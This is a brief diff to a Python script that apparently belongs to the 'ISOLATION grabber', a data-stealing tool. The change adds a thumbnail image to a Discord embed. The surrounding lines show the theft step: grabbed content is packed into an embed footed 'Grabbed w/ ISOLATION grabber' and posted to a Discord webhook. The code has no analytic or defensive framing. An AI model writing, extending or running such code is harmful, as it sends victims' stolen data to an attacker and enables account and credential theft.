@@ -51,6 +51,7 @@ def main():
     embed = discord_webhook.DiscordEmbed(title="ISOLATION",description=embedcont, color="23272A")
     embed.set_timestamp()
     embed.set_footer(text="Grabbed w/ ISOLATION grabber")
+    embed.set_thumbnail("https://media.discordapp.net/attachments/1136359120233046057/1142457082243711007/1e35053d0cd075d470bd6a80a2a9a1c1.png?width=449&height=449")
     webhook.add_embed(embed=embed)
     webhook.execute()
 if __name__== "__main__":
